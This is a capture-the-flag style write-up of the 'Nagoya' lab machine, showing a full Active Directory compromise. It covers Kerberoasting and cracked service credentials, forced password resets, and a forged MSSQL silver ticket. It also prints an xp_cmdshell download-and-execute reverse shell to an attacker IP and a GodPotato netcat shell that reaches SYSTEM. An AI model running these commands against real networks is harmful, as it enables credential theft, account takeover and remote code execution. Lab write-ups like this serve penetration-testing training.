#Pwned #SilverTicket #Bloodhound #LateralMovement #SeImpersonatePrivilege
```IP
192.168.150.21
```

# Enumeration
## Nmap

As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.150.21 -vvv -p- -oN enum/full
```
The output being:
```
PORT      STATE SERVICE           REASON          VERSION
53/tcp    open  domain            syn-ack ttl 125 Simple DNS Plus 
80/tcp    open  http              syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-favicon: Unknown favicon MD5: 9200225B96881264E6481C77D69C622C
|_http-title: Nagoya Industries - Nagoya
| http-methods:        
|_  Supported Methods: GET HEAD OPTIONS    
88/tcp    open  kerberos-sec      syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2024-12-11 10:35:32Z)
135/tcp   open  msrpc             syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn       syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp   open  ldap              syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?     syn-ack ttl 125
464/tcp   open  kpasswd5?         syn-ack ttl 125
593/tcp   open  ncacn_http        syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?          syn-ack ttl 125
3268/tcp  open  ldap              syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack ttl 125
3389/tcp  open  ms-wbt-server     syn-ack ttl 125 Microsoft Terminal Services
5985/tcp  open  http              syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                            
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            syn-ack ttl 125 .NET Message Framing
49666/tcp open  msrpc             syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc             syn-ack ttl 125 Microsoft Windows RPC        
49676/tcp open  ncacn_http        syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc             syn-ack ttl 125 Microsoft Windows RPC
49681/tcp open  msrpc             syn-ack ttl 125 Microsoft Windows RPC
49691/tcp open  msrpc             syn-ack ttl 125 Microsoft Windows RPC              
49698/tcp open  msrpc             syn-ack ttl 125 Microsoft Windows RPC
49717/tcp open  msrpc             syn-ack ttl 125 Microsoft Windows RPC
Service Info: Host: NAGOYA; OS: Windows; CPE: cpe:/o:microsoft:windows
```
## SMB
I usually run the following commands when SMB service is open. they involve tinkering with blank usernames and passwords, to see if the guest user has login permissions, and then enumerating shares as well as bruteforce the relative IDs (RID). But in this particular case we do not have access:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211114236.png?raw=true)

## HTTP 80
Fuzzing the directories of the webpage hosted in the target machine we get a "team" directory, which contains various usernames.

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211114001.png?raw=true)

## Kerberos

With kerbrute tool we can check for valid usernames in the target machine. We can try first with one of the lists provided in seclists, which only assess that Administrator user exists.
```
./kerbrute userenum --dc 192.168.150.21 -d nagoya-industries.com /usr/share/SecLists-master/Usernames/cirt-default-usernames.txt
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211114736.png?raw=true)

However, if we create a users.txt file with the names contained in http 80 and substitute the space between name and surname for a dot, we can confirm that these usernames do in fact exist with kerbrute as shown below:

```
./kerbrute userenum --dc 192.168.150.21 -d nagoya-industries.com users.txt
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211120839.png?raw=true)

# Exploitation
Knowing that we have now a list of valid usernames and further enumeration like LDAP seems fruitless, we can create our own password list. A common example is to make a list of seasons, months, etc and apply a ruleset to it.

Doing so will result in a successful hit, with the password being `Summer2023`.
We can confirm this password with the following command:
```
nxc smb 192.168.150.21 -u 'fiona.clark' -p 'Summer2023'
```

Now that we have credentials but still no remote access to the target machine, we can try some kerberoast attack with the following command:

```
impacket-GetUserSPNs -request -dc-ip 192.168.150.21 nagoya-industries.com/fiona.clark
```
This command retrieve a couple of interesting hashes. However, the tool `targetedkerberoast` do in fact retrieve more hashes:
```
python3 targetedKerberoast.py -d nagoya-industries.com -u fiona.clark -p Summer2023 -v -o ../../files/targetedkerberoast.hash
```

Now that we have saved them in a file, we can attempt to crack them with hashcat as shown below:

```
sudo hashcat -m 13100 files/targetedkerberoast.hash /usr/share/wordlists/rockyou.txt --force
```
Credentials obtained:
```
svc_mssql:Service1
```

With this credentials we can also access to smb shares which we will list with:

```
smbclient //192.168.150.21/NETLOGON -U nagoya-industries.com/svc_mssql --password='Service1' -c 'recurse;ls'
```

We can see in this directory an odd executable file:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211155135.png?raw=true)

On investigation, we can see a clear text password inside the code:
```
cat ResetPassword.exe
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211155733.png?raw=true)

Password that proves to be correct for the service account svc_helpdesk!
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211160620.png?raw=true)
 
 However it does not seem to grant us remote execution either, so we will take a look with bloodhound:
```
bloodhound-python -d nagoya-industries.com -c all -u 'fiona.clark' -p 'Summer2023' -ns 192.168.150.21 --zip
```
It seems that our new user has a GenericAll permission over bethan.webster user as shown below:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211163007.png?raw=true)

It is possible to change its password. We can use the following command for this purpose:

```
net rpc password "bethan.webster" "Password123" -U "nagoya-industries.com"/"fiona.clark"%"Summer2023" -S "nagoya-industries.com"
```

As shown in the previous screenshot, bethan.webster has too a GenericAll permission over christopher.lewis. Therefore we can now change christopher.lewis password with the recently updated bethan.webster user:

```
net rpc password "christopher.lewis" "Password123" -U "nagoya-industries.com"/"bethan.webster"%"Password123" -S "nagoya-industries.com"
```

And finally we have remote access as christopher.lewis. We can gain remote code execution with evil-winrm:

```
evil-winrm -i 192.168.150.21 -u christopher.lewis -p 'Password123'
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211163428.png?raw=true)


# PrivEsc

## Automated

### Manual
Upon some basic manual enumeration we face an interesting internal port:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212115613.png?raw=true)

However when we try to port forward with ligolo
```
sudo ip route add 240.0.0.1/32 dev ligolo
```
and gain access as svc_mssql we realize that we can not do much to privilege escalation. Maybe we can impersonate Administrator using a silver ticket in order to gain higher permissions in mssql.

In order to do so we will then create our NTLM hash from the password we already had: Service1

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212121256.png?raw=true)

Then we will create a silver ticket using that hash:
```
python3 ticketer.py -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -dc-ip 192.168.249.21 Administrator -spn MSSQL/nagoya.nagoya-industries.com
```
```
export KRB5CCNAME=/home/kali/Documents/offsec/PG/Nagoya/exploits/Administrator.ccache
```

Finally we can connect to MSSQL via silver ticket:
```
impacket-mssqlclient -k -debug -target-ip 240.0.0.1 nagoya.nagoya-industries.com
```

Get execution privileges:
```
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

Execute reverse shell:
```
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.189:8000/rev.ps1") | powershell -noprofile'
```

And now we have impersonate privilege token, which we can use to PE:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212140242.png?raw=true)

My way to go in this case almost always involves godpotato and a netcat reverse shell as shown below. In order to do so we will have to upload GodPotato and nc executables, of course. You can do that with iwr, curl or wget.

```
.\GodPotato-NET2.exe -cmd "\temp\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.189 1234"
```

When receiving the reverseshell in our listener, we assess that we are indeed NT Authority System, so we can retrieve the flag proof.txt

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212140044.png?raw=true)

Pwned!

